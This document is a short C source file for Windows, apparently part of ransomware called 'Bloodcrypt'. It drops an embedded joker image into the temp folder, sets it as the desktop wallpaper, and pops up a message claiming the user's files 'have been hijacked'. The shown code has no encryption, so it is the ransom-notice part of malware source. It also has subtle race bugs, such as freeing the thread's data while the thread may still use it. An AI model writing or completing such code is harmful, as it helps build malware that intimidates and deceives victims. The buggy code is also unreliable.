#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include "blood.h"

#define SIZE_BUFFER_ALLOC  4096

void msgbox(char *msg) 
{
   MessageBoxA(NULL, msg, "Bloodcrypt", MB_OK);
}

void msgbox_error(char *msg) 
{
   MessageBoxA(NULL, msg, "Bloodcrypt", MB_ICONERROR);
}

void change_wallpaper(unsigned char *filepath)
{
  HKEY hKey;
  RegOpenKeyExA(HKEY_CURRENT_USER, WALLPAPER_REGISTRY, 0, KEY_ALL_ACCESS, &hKey);
  RegSetValueExA(hKey, "Wallpaper", 0, REG_SZ, (LPBYTE) filepath, (DWORD) strlen(filepath) + 1);
  RegCloseKey(hKey);
}

typedef struct MyData {
    unsigned char *imgPath;
    unsigned char *imgData;
    DWORD imgSize;
} MYDATA, *PMYDATA;

DWORD WINAPI AsyncCreateTempFile(LPVOID lpParameter)
{
  PMYDATA args = (PMYDATA) lpParameter;
  HANDLE imgFile = CreateFileA(args->imgPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

  DWORD nImgData;
  WriteFile(imgFile, args->imgData, args->imgSize, &nImgData, NULL);

  CloseHandle(imgFile);
  
  return 0;
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmdshow)
{
  HRSRC hResInfo = FindResourceA(NULL, "IMG_JOKER", RT_RCDATA);
  if (!hResInfo) {
    msgbox_error("Cannot find resource");
    return EXIT_FAILURE;
  }

  HGLOBAL hResData = LoadResource(NULL, hResInfo);
  if (!hResData) {
    msgbox_error("Cannot load resource");
    return EXIT_FAILURE;
  }

  unsigned char *imgData = (unsigned char *) LockResource(hResData); 
  DWORD imgSize = SizeofResource(NULL, hResInfo);

  unsigned char tempPath[SIZE_BUFFER_ALLOC];
  GetTempPathA(SIZE_BUFFER_ALLOC, tempPath);

  unsigned char imgPath[SIZE_BUFFER_ALLOC];
  
  // TEMP_PATH + FILENAME
  snprintf(imgPath, SIZE_BUFFER_ALLOC, "%s%s", tempPath, "joker.jpg");
  
  PMYDATA pData = (PMYDATA) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(MYDATA));

  pData->imgPath = imgPath;
  pData->imgSize = imgSize;
  pData->imgData = imgData;

  DWORD myThreadID;
	HANDLE myHandle = CreateThread(0, 0, AsyncCreateTempFile, (LPVOID) pData, 0, &myThreadID);

  CloseHandle(myHandle);
  HeapFree(GetProcessHeap(), 0, pData);
  
  SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (void *) imgPath, SPIF_UPDATEINIFILE);
  msgbox("Your files have been hijacked by Bloodcrypt");

  return EXIT_SUCCESS;
}